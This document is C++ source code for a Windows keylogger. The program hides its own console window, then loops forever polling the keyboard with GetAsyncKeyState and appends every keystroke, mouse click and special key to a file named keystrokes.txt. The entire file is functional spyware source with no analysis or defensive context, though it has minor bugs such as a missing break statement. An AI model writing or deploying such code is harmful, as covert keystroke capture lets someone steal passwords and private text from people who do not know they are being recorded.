#include<fstream>
#include<conio.h>
#include<iostream>
#include<Windows.h>
char key;
using namespace std;
int flag=3,t=0;
int main()
{
::ShowWindow(::GetConsoleWindow(),SW_HIDE);
	fstream fo("keystrokes.txt",ios::out|ios::trunc); 
	fo.close();      
	while(true)
	{  
	   
	  for(int i=8;i<=225;i++)
   		{
   		 
		   if(GetAsyncKeyState(i)==-32767)
		   { 
		    
		     if((GetKeyState(VK_CAPITAL)& 0x0001)!=0)
			   {  
					    flag=1;cout<<"caps on\n";
					    
		        }
				else
			   {
		          flag=0;cout<<"caps of";
		        
 		       }
		    fo.open("keystrokes.txt",ios::out|ios::app);
		    switch(i)
		    {
		      case 16:
		      	
		             fo<<" SHIFT!+";	
		             break;
		      case 8:
		             fo<<" BACKSPACE! ";		 	
		             break;
     		 case  VK_LBUTTON:
		             fo<<"LEFT CLICK! ";	
		             break;
     		case VK_RBUTTON:
		             fo<<"RIGHT CLICK! ";	
		    case 13:
		             fo<<" RETURN!\n";	
		             break;       
			case 27:
		             fo<<" ESCAPE!";	
		           break;
		     case 64:
			        fo<<'@';
					break;
			case 190:
			       fo<<'.';
				   break;		      
		
					  		       	   	 	
			default:
				if(flag==1)
				  {
		          }
				else if(flag==0) 
				{ 
				   if(i>=65&&i<=90)
				    i=i+32;
			    }
			    
		    key=i; 
		   	cout<<key<<"=";
		   	if(i!=20)
		      fo<<key;		
		   	  break;	              
			 }
			 cout<<i<<"\n";
		   	fo.close();
		   }
		   
	     }
	    		
   }                      
return 0;            
getch();      
}
